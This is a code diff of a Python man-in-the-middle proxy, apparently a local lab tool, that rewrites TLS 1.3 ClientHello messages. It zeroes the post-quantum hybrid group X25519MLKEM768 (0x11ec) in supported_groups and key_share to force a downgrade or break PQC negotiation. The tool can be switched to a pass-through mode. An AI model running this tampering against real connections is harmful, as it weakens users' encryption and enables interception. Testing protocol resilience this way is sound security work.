@@ -1,96 +1,161 @@
+import argparse
+import select
 import socket
-import sys
 import threading
 
-if hasattr(sys.stdout, 'reconfigure'):
-    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
 
-LISTEN_PORT = 6500
-TARGET_PORT = 6000
+def exact(sock, size):
+    data = bytearray()
+    while len(data) < size:
+        part = sock.recv(size - len(data))
+        if not part:
+            raise ValueError("EOF before complete ClientHello")
+        data.extend(part)
+    return bytes(data)
 
-def tamper_and_strip_pqc(data):
-    """
-    Kẻ trung gian MITM đánh chặn gói tin TLS 1.3 Client Hello:
-    Phát hiện Extension PQC (0x11ec) và cố ý thay đổi/cắt bỏ thành 0x0000
-    nhằm ép Server hạ cấp về thuật toán cổ điển hoặc làm hỏng thương lượng PQC.
-    """
-    if len(data) > 6 and data[0] == 0x16 and data[5] == 0x01:
-        print("\n" + "=" * 65)
-        print("[!] [MITM PROXY] Bắt được gói tin TLS 1.3 Client Hello trên đường truyền!")
-        
-        if b'\x11\xec' in data:
-            print("[!] [ATTACK] Phát hiện Extension PQC (X25519MLKEM768, 1216 bytes)!")
-            print("[!] [DOWNGRADE] Đang cắt bỏ / thay thế mã nhóm PQC (0x11ec -> 0x0000)...")
-            tampered = data.replace(b'\x11\xec', b'\x00\x00')
-            print("[+] Đã cắt bỏ PQC thành công! Đang chuyển tiếp gói tin lỗi vào Server...")
-            print("=" * 65 + "\n")
-            return tampered
-    return data
 
-def handle_conn(client_sock):
-    target_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+def group_offsets(hello):
+    def number(pos):
+        if pos + 2 > len(hello):
+            raise ValueError("Truncated TLS field")
+        return int.from_bytes(hello[pos:pos + 2], "big")
+
+    p = 38
+    p += 1 + hello[p]
+    p += 2 + number(p)
+    p += 1 + hello[p]
+    end = p + 2 + number(p)
+    p += 2
+    if end != len(hello):
+        raise ValueError("Invalid extensions length")
+
+    offsets, shares, seen = [], [], set()
+    while p < end:
+        kind, size = number(p), number(p + 2)
+        p += 4
+        stop = p + size
+        if stop > end or kind in seen:
+            raise ValueError("Invalid or duplicate extension")
+        seen.add(kind)
+
+        if kind in (10, 51):
+            q = p + 2
+            if size < 2 or q + number(p) != stop:
+                raise ValueError("Invalid group/share vector")
+            while q < stop:
+                if q + (4 if kind == 51 else 2) > stop:
+                    raise ValueError("Truncated group/share")
+                group = number(q)
+                if group == 0x11EC:
+                    offsets.append(q)
+                q += 2
+                if kind == 51:
+                    length = number(q)
+                    shares.append((group, length))
+                    q += 2 + length
+                    if not length or q > stop:
+                        raise ValueError("Invalid key share length")
+        p = stop
+    return offsets, shares
+
+
+def client_hello(sock):
+    wire, handshake, positions = bytearray(), bytearray(), []
+    for _ in range(128):
+        header = exact(sock, 5)
+        size = int.from_bytes(header[3:5], "big")
+        if header[0] != 22 or header[1] != 3 or not 0 < size <= 16384:
+            raise ValueError("Invalid initial handshake record")
+        if len(wire) + 5 + size > 131072:
+            raise ValueError("ClientHello too large")
+
+        start = len(wire) + 5
+        body = exact(sock, size)
+        wire.extend(header + body)
+        handshake.extend(body)
+        positions.extend(range(start, start + size))
+
+        if len(handshake) >= 4:
+            total = 4 + int.from_bytes(handshake[1:4], "big")
+            if handshake[0] != 1 or total > 65536:
+                raise ValueError("Invalid ClientHello header")
+            if len(handshake) >= total:
+                offsets, shares = group_offsets(bytes(handshake[:total]))
+                return wire, positions, offsets, shares
+    raise ValueError("Too many fragmented records")
+
+
+def handle(client, passthrough):
     try:
-        target_sock.connect(("127.0.0.1", TARGET_PORT))
-    except Exception as e:
-        print(f"[-] Không thể kết nối tới Server cổng {TARGET_PORT}: {e}")
-        client_sock.close()
-        return
+        with client, socket.create_connection(
+            ("127.0.0.1", 6000), timeout=8
+        ) as upstream:
+            client.settimeout(8)
+            wire, positions, offsets, shares = client_hello(client)
 
-    first_pkt = True
-    try:
-        # Nhận từ Client -> gửi sang Server
-        def forward_to_server():
-            nonlocal first_pkt
-            try:
-                while True:
-                    data = client_sock.recv(4096)
+            print(
+                f"TCP client={client.getpeername()} "
+                f"proxy_upstream={upstream.getsockname()} "
+                "node=127.0.0.1:6000",
+                flush=True
+            )
+            print(
+                f"BEFORE key_shares={[(hex(g), n) for g, n in shares]}",
+                flush=True
+            )
+
+            if passthrough:
+                print("Forward unchanged: tamper=False", flush=True)
+            else:
+                if len(offsets) != 2 or (0x11EC, 1216) not in shares:
+                    raise ValueError(
+                        "Expected hybrid in supported_groups and key_share"
+                    )
+                for offset in offsets:
+                    wire[positions[offset]] = 0
+                    wire[positions[offset + 1]] = 0
+                print(
+                    "AFTER: 0x11ec -> 0x0000 in two group fields; "
+                    "key material unchanged",
+                    flush=True
+                )
+
+            upstream.sendall(wire)
+            client.settimeout(None)
+            upstream.settimeout(None)
+
+            while True:
+                ready, _, _ = select.select([client, upstream], [], [], 30)
+                if not ready:
+                    return
+                for source in ready:
+                    data = source.recv(65536)
                     if not data:
-                        break
-                    if first_pkt:
-                        data = tamper_and_strip_pqc(data)
-                        first_pkt = False
-                    target_sock.sendall(data)
-            except Exception:
-                pass
+                        return
+                    target = upstream if source is client else client
+                    target.sendall(data)
+    except Exception as exc:
+        print(f"Proxy connection ended: {exc}", flush=True)
 
-        # Nhận từ Server -> gửi ngược lại Client (Alert / ServerHello)
-        def forward_to_client():
-            try:
-                while True:
-                    data = target_sock.recv(4096)
-                    if not data:
-                        break
-                    client_sock.sendall(data)
-            except Exception:
-                pass
 
-        t1 = threading.Thread(target=forward_to_server, daemon=True)
-        t2 = threading.Thread(target=forward_to_client, daemon=True)
-        t1.start()
-        t2.start()
-        t1.join()
-        t2.join(timeout=1.0)
-    except Exception:
-        pass
-    finally:
-        client_sock.close()
-        target_sock.close()
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser()
+    parser.add_argument("--pass-through", action="store_true")
+    args = parser.parse_args()
 
-def main():
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    s.bind(("127.0.0.1", LISTEN_PORT))
-    s.listen(5)
-    print("=" * 65)
-    print(f"[*] MITM Proxy đang lắng nghe tại cổng {LISTEN_PORT} -> Chuyển tiếp tới {TARGET_PORT}")
-    print("[*] Sẵn sàng đánh chặn và sửa đổi gói tin bắt tay TLS PQC...")
-    print("=" * 65)
-    try:
-        while True:
-            c, _ = s.accept()
-            threading.Thread(target=handle_conn, args=(c,), daemon=True).start()
-    except KeyboardInterrupt:
-        s.close()
-
-if __name__ == '__main__':
-    main()
+    with socket.socket() as listener:
+        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        listener.bind(("127.0.0.1", 6500))
+        listener.listen(10)
+        mode = "PASS_THROUGH" if args.pass_through else "HYBRID_GROUP_TAMPERING"
+        print(f"Listening :6500 -> :6000 | {mode}", flush=True)
+        try:
+            while True:
+                client, _ = listener.accept()
+                threading.Thread(
+                    target=handle,
+                    args=(client, args.pass_through),
+                    daemon=True
+                ).start()
+        except KeyboardInterrupt:
+            pass
